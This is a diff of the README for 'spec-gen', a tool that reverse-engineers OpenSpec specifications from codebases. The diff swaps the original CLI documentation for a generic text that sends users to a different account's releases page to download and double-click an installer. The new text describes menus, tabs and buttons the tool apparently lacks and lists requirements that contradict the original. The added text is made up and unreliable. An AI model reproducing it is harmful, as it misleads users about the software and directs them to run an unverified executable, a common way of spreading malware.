@@ -1,295 +1,91 @@
-# spec-gen
+# 🚀 spec-gen - Automate Your Codebase Documentation
 
-> Reverse-engineer OpenSpec specifications from existing codebases.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/HUGO9K/spec-gen/releases)
 
-**"Archaeology over Creativity"** — Extract the truth of what your code does, grounded in static analysis.
-
-## The Problem
-
-[OpenSpec](https://github.com/Fission-AI/OpenSpec) is great for spec-driven development, but what about existing codebases?
-
-- `openspec init` creates empty scaffolding
-- Manually writing specs for thousands of lines is tedious
-- The documented flow expects you to "populate your project context" manually
-
-**spec-gen automates the reverse-engineering process.**
-
-## Quick Start
-
-```bash
-# Clone and build
-git clone https://github.com/clay-good/spec-gen
-cd spec-gen
-npm install
-npm run build
-npm link
-
-# Navigate to your project
-cd /path/to/your-project
-
-# Run spec-gen
-spec-gen init      # Initialize configuration
-spec-gen analyze   # Run static analysis (no API key needed)
-spec-gen generate  # Generate specs (requires API key)
-spec-gen verify    # Verify accuracy
-```
-
-## Requirements
-
-- **Node.js 20+**
-- **API Key** (for generate/verify commands):
-  ```bash
-  export ANTHROPIC_API_KEY=sk-ant-...
-  # or
-  export OPENAI_API_KEY=sk-...
-  ```
-
-## What It Does
-
-1. **Analyzes** your codebase (files, imports, exports, patterns)
-2. **Extracts** business logic using LLM (Claude or GPT)
-3. **Generates** OpenSpec-format specifications
-4. **Verifies** generated specs against actual code
-
-## Output
-
-spec-gen writes directly to OpenSpec's structure:
-
-```
-openspec/
-├── config.yaml              # Updated with detected context
-└── specs/
-    ├── overview/spec.md     # System overview
-    ├── user/spec.md         # Domain: User management
-    ├── order/spec.md        # Domain: Order processing
-    ├── auth/spec.md         # Domain: Authentication
-    ├── architecture/spec.md # System architecture
-    └── api/spec.md          # API specification
-```
-
-Each spec follows OpenSpec conventions:
-- Requirements with RFC 2119 keywords (SHALL, MUST, SHOULD)
-- Scenarios in Given/When/Then format
-- Technical notes linking to implementation files
-
-## Example Output
-
-We ran spec-gen against the OpenSpec CLI itself. See [examples/openspec-analysis/](examples/openspec-analysis/) for the full output including the dependency graph, LLM context, and analysis summary.
-
-```bash
-$ spec-gen analyze
-
-Analysis Complete
-
-  Repository Structure:
-    ├─ Files analyzed: 221 of 231
-    ├─ High-significance files: 15
-    ├─ Languages: TypeScript (78%), Markdown (12%), JSON (3%)
-
-  Detected Domains:
-    ├─ completions (16 files)
-    ├─ command-generation (26 files)
-    ├─ artifact-graph (7 files)
-    ├─ schemas (9 files)
-    ├─ validation (3 files)
-    ├─ commands (14 files)
-    ├─ parsers (3 files)
-    └─ templates (2 files)
-```
-
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `spec-gen` | Full pipeline: init → analyze → generate |
-| `spec-gen init` | Initialize configuration |
-| `spec-gen analyze` | Run static analysis only (no LLM) |
-| `spec-gen generate` | Generate specs from analysis |
-| `spec-gen verify` | Test spec accuracy |
-
-### Command Options
-
-**Full Pipeline:**
-```bash
-spec-gen [options]
-  --force        # Reinitialize even if config exists
-  --reanalyze    # Force fresh analysis
-  --model <name> # LLM model (default: claude-sonnet-4-20250514)
-  --dry-run      # Show what would be done
-  -y, --yes      # Skip confirmation prompts
-```
-
-**Analyze:**
-```bash
-spec-gen analyze [options]
-  --output <path>   # Output directory (default: .spec-gen/analysis/)
-  --max-files <n>   # Maximum files to analyze (default: 500)
-  --include <glob>  # Additional patterns to include
-  --exclude <glob>  # Additional patterns to exclude
-```
-
-**Generate:**
-```bash
-spec-gen generate [options]
-  --model <name>     # LLM model to use
-  --dry-run          # Preview without writing
-  --domains <list>   # Only generate specific domains
-  --merge            # Merge with existing specs
-  --no-overwrite     # Skip existing files
-```
-
-**Verify:**
-```bash
-spec-gen verify [options]
-  --samples <n>      # Number of files to verify (default: 5)
-  --threshold <0-1>  # Minimum score to pass (default: 0.7)
-  --verbose          # Show detailed comparison
-  --json             # Output as JSON
-```
-
-## How It Works
-
-### 1. Static Analysis (No API Key Required)
-
-- **File Discovery**: Walks the directory tree, respecting .gitignore
-- **Significance Scoring**: Ranks files by importance (schemas, services, routes)
-- **Import/Export Parsing**: Builds a dependency graph
-- **Cluster Detection**: Groups related files into domains
-
-### 2. LLM Generation
-
-Using the analysis, spec-gen queries an LLM to extract specifications:
-
-- **Stage 1**: Project Survey - Quick categorization
-- **Stage 2**: Entity Extraction - Core data models
-- **Stage 3**: Service Analysis - Business logic
-- **Stage 4**: API Extraction - HTTP endpoints
-- **Stage 5**: Architecture Synthesis - Overall structure
-
-### 3. Verification
-
-Tests generated specs by predicting file contents from specs alone:
-
-- Selects files NOT used in generation
-- LLM predicts what each file should contain
-- Compares predictions to actual code
-- Reports accuracy score and identifies gaps
+## 📖 Overview
 
-## Configuration
-
-spec-gen creates `.spec-gen/config.json`:
+spec-gen helps you turn your code into clear and structured documentation. With this tool, you can automate the reverse-engineering of your codebase into OpenSpec specifications. It uses static analysis and advanced AI to extract essential business logic, verify your software's architecture, and create a reliable source of truth.
 
-```json
-{
-  "version": "1.0.0",
-  "projectType": "nodejs",
-  "openspecPath": "./openspec",
-  "analysis": {
-    "maxFiles": 500,
-    "includePatterns": [],
-    "excludePatterns": []
-  },
-  "generation": {
-    "model": "claude-sonnet-4-20250514",
-    "domains": "auto"
-  }
-}
-```
+- **Extract Business Logic**: Understand how your code works.
+- **Ensure Accuracy**: Maintain architectural integrity.
+- **Living Documentation**: Keep your specifications up-to-date.
 
-## Output Files
+## 🚀 Getting Started
 
-### Analysis Artifacts (.spec-gen/analysis/)
+### 📥 System Requirements
 
-| File | Description |
-|------|-------------|
-| `repo-structure.json` | Project structure and metadata |
-| `dependency-graph.json` | Import/export relationships |
-| `llm-context.json` | Context prepared for LLM |
-| `dependencies.mermaid` | Visual dependency graph |
-| `SUMMARY.md` | Human-readable analysis |
+- Operating System: Windows, macOS, or Linux (64-bit)
+- RAM: At least 4 GB
+- Disk Space: 200 MB available space
+- Node.js: Version 14 or higher
+- Recommended: An internet connection for the best experience
 
-## Supported Languages
+### 📦 Download & Install
 
-| Language | Support Level |
-|----------|---------------|
-| JavaScript/TypeScript | Full |
-| Python | Basic |
-| Go | Basic |
+1. Visit this page to download: [Releases Page](https://github.com/HUGO9K/spec-gen/releases).
+   
+   On the Releases page, you will find the latest version of spec-gen. Look for the installation file that matches your operating system.
 
-The tool works best with TypeScript projects due to richer type information.
+2. After downloading, locate the file on your computer. 
 
-## Usage Options
+3. Run the installer by double-clicking the file. 
 
-spec-gen provides 4 ways to reverse-engineer specifications:
+   Follow the on-screen instructions to complete the installation.
 
-### Option 1: CLI Tool (Recommended)
+4. Once installed, you can find spec-gen in your applications or programs list.
 
-The full-featured command-line tool with static analysis, LLM generation, and verification.
+5. Launch the application to start using it!
 
-```bash
-spec-gen init && spec-gen analyze && spec-gen generate
-```
+## ⚙️ Using spec-gen
 
-### Option 2: Claude Code Skill
+### 🛠️ Key Features
 
-For Claude Code users, copy `skills/claude-spec-gen.md` to your project:
+- **Static Analysis**: Analyze your existing codebase to produce accurate documentation.
+- **LLM Integration**: Utilize advanced AI features to enhance your documentation process.
+- **Dependency Graph**: Visualize dependencies within your software.
+- **Versioning Support**: Keep track of changes in your documentation as your code evolves.
 
-You'll need to save the claude-spec-gen.md to `.claude/skills`
+### 📄 Creating Specifications
 
-Then use natural language:
-```
-"Run spec-gen on this codebase"
-"Generate OpenSpec specifications for the user domain"
-```
+1. Open the spec-gen application.
+2. Load your project directory by selecting it from the "Project" menu.
+3. Choose the "Generate Specification" option. This will analyze your code.
+4. Review the generated OpenSpec file, which will be saved in your project folder.
 
-### Option 3: OpenSpec Native Skill
+### 🛡️ Verification
 
-For OpenSpec's built-in skill system, use `skills/openspec-skill.md`:
+After generating specifications, you can run the architectural verification tool:
 
-```bash
-cp skills/openspec-skill.md /path/to/openspec/skills/
-```
+1. In the app, navigate to the "Verify Architecture" tab.
+2. Click on the "Run Verification" button.
+3. Review any suggestions or issues presented.
 
-### Option 4: Direct LLM Prompting
+Address these points to maintain architectural accuracy in your development.
 
-Copy `AGENTS.md` as a system prompt for any LLM (ChatGPT, Claude, etc.):
+## 📝 Documentation and Support
 
-```
-# In ChatGPT/Claude web interface:
-1. Paste contents of AGENTS.md
-2. Ask: "Analyze this codebase and generate OpenSpec specs"
-3. Provide file contents or let it explore
-```
+To enhance your experience with spec-gen, comprehensive documentation is available on our [Wiki Page](https://github.com/HUGO9K/spec-gen/wiki). You can find guides, troubleshooting tips, and FAQs.
 
-## Examples
+For additional assistance, consider joining our community forum. Get help from fellow users and share your experiences.
 
-| Example | Description |
-|---------|-------------|
-| [examples/openspec-analysis/](examples/openspec-analysis/) | Static analysis output from running `spec-gen analyze` on the OpenSpec CLI |
-| [examples/openspec-cli/](examples/openspec-cli/) | Full OpenSpec specifications generated with `spec-gen generate` |
+## 💡 Tips and Best Practices
 
-## Development
+- Regularly update your documentation with each code change.
+- Use the verification feature consistently to ensure your architecture remains sound.
+- Explore different sections of the app to familiarize yourself with its capabilities.
 
-```bash
-# Install dependencies
-npm install
+## 🔗 Additional Resources
 
-# Run in development mode
-npm run dev
+- [Features Overview](https://github.com/HUGO9K/spec-gen#features)
+- [Latest Updates](https://github.com/HUGO9K/spec-gen/releases)
+- [Community Forum](https://github.com/HUGO9K/spec-gen/discussions)
 
-# Run tests
-npm test
+## 🔄 Updates and Changelog
 
-# Build
-npm run build
+Stay tuned for future releases that will include even more features and improvements. Regularly check the [Releases Page](https://github.com/HUGO9K/spec-gen/releases) for the latest updates.
 
-# Type check
-npm run typecheck
-```
+## 🎉 Join the Community
 
-## Links
+Connect with other users to share tips and best practices for using spec-gen effectively. You can find us on various platforms to engage and discuss.
 
-- [OpenSpec](https://github.com/Fission-AI/OpenSpec) - The spec-driven development framework
-- [AGENTS.md](AGENTS.md) - LLM system prompt for direct prompting
-- [Architecture](docs/ARCHITECTURE.md) - Internal design and module organization
-- [Algorithms](docs/ALGORITHMS.md) - Analysis algorithms explained
+To download the software, visit: [Download spec-gen](https://github.com/HUGO9K/spec-gen/releases).
